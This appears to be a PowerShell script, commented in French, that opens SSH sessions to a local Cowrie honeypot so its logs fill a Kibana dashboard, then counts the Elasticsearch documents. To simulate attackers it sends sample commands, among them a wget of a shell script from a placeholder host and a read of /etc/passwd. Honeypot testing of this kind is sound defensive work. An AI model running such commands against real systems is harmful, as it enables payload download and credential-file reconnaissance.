# Genere de nouveaux logs Cowrie (honeypot) pour remplir Kibana
Write-Host "Generation de logs via connexions SSH vers Cowrie..." -ForegroundColor Cyan
Write-Host "Si demande, mot de passe: 123456 ou admin" -ForegroundColor Yellow

$port = 2222
$hostAddr = "127.0.0.1"

if (-not (Get-Command ssh -ErrorAction SilentlyContinue)) {
    Write-Host "Client SSH manquant. Installez OpenSSH Client." -ForegroundColor Red
    exit 1
}

Write-Host "`nConnexion 1/3 - tapez le mot de passe si demande..."
Start-Process ssh -ArgumentList @(
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=NUL",
    "-p", $port,
    "root@$hostAddr",
    "uname -a; id; wget http://test.example/shell.sh"
) -Wait -NoNewWindow

Start-Sleep -Seconds 2
Write-Host "`nConnexion 2/3..."
Start-Process ssh -ArgumentList @(
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=NUL",
    "-p", $port,
    "admin@$hostAddr",
    "ls -la; cat /etc/passwd"
) -Wait -NoNewWindow

Write-Host "`nAttente indexation Logstash (45 sec)..."
Start-Sleep -Seconds 45

$count = docker exec hp-elasticsearch curl -s "http://localhost:9200/honeypot-attacks-*/_count" 2>$null
Write-Host "Documents dans Elasticsearch: $count" -ForegroundColor Green
Write-Host "`nOuvrez Discover:" -ForegroundColor Cyan
Write-Host "  .\scripts\open-discover.ps1"
